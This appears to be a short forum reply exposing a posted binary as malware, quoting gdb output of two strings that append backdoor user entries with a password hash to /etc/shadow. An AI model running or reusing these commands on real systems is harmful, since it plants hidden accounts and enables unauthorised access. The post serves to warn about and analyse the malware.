heh, dude seriously, at least learn to strip -s your bin's.

FYI this is malware, it does things like:

(gdb) x/s 0x80494e0
0x80494e0 <__dso_handle+816>:    "echo
toor:\\$1\\$nLv4Q0aJ\\$rV4IkBgFH1NMo\\/HzHX35u/:13531:0:99999:7:::>>/etc/shadow"
(gdb) x/s 0x8049534
0x8049534 <__dso_handle+900>:    "echo
newbie:\\$1\\$nLv4Q0aJ\\$rV4IkBgFH1NMo\\/HzHX35u/:13531:0:99999:7:::>>/etc/shadow"

Interestingly enough, the only newb here is you.
